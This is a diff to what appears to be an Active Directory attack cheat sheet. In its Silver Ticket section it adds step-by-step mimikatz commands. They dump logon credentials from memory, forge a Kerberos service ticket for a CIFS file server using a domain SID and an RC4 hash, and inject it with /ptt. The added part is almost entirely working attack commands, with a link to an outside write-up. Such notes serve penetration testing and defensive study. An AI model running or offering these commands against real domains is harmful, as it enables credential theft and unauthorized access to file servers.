@@ -85,6 +85,14 @@ Active Directory Attacks:-
 	Silver Ticket:-
 	
 		Silver Ticket only enables an attacker to forge ticket-granting service (TGS) tickets for specific services. TGS tickets are encrypted with the password hash for the service; therefore, if an adversary steals the hash for a service account, they can mint TGS tickets for that service.
+		Steps:-
+			PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit //or below
+			privilege::debug //run in debug mode
+			sekurlsa::logonpasswords //view passwords in memory
+			kerberos::golden /user:NonExistentUser /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:FileServer1.domain.com /service:cifs /ptt
+			misc::cmd
+			check https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html for more details.
+
 			
 ![image](https://user-images.githubusercontent.com/91881471/174433005-d10ed507-c66c-4760-9eff-4a1c9099ee7e.png)
 
